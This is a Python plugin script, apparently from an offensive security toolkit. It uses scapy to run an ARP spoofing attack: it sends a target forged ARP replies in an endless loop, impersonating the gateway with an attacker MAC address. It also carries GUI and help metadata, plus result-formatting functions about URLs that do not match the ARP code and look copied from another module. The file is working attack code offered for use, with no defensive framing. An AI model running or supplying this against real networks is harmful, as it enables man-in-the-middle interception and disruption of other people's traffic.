from scapy.all import ARP, send
import time

def run_script(**args):
    try:
        target_ip = args.get("ip")
        source_ip = args.get("ip2")
        attacker_mac = args.get("mac")

        if not target_ip or not source_ip or not attacker_mac:
            print("Missing required parameters: ip, ip2, or mac.")
            return

        while True:
            packet = ARP(op=2, pdst=target_ip, psrc=source_ip, 
                         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=attacker_mac)
            send(packet, verbose=False)
            print(f"Packet sent to target {target_ip} spoofing {source_ip}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("Exit")

def help():
    return {
        "description": "This script performs an ARP spoofing attack.",
        "parameters": {
            "ip": {
                "description": "Target IP to spoof",
                "required": True,
                "type": "string"
            },
            "ip2": {
                "description": "Gateway IP address (to impersonate)",
                "required": True,
                "type": "string"
            },
            "mac": {
                "description": "Attacker's MAC address",
                "required": True,
                "type": "string"
            }
        }
    }

def gui_inputs():
    return [
        {"label": "Target IP", "id": "ip", "type": "text"},
        {"label": "Gateway IP (ip2)", "id": "ip2", "type": "text"},
        {"label": "Attacker MAC Address", "id": "mac", "type": "text"}
    ]

def display_result(result):
    print("Results:")
    for res in result:
        print("IP: " + res["ip"] + "\t Status code: " + str(res["exists"]))
        if res["exists"]:
            for l in res["content"]:
                print("\t" + l)

def format_to_table(res):
    return {
        "headers": ["URL", "Exists", "Content"],
        "rows": [
            [
                r["url"],
                str(r["exists"]),
                "\n".join(list(set(map(lambda e: ("> " + e) if len(e) < 100 else "> Redacted: Too long (export to see it)", r.get("content", [])))))
            ]
            for r in res
        ]
    }

def additional_functions():
    return {}

def main():
    # Exemple d'appel en dur, à adapter selon le besoin
    run_script(ip="192.168.1.100", ip2="192.168.1.1", mac="00:11:22:33:44:55")

if __name__ == '__main__':
    main()
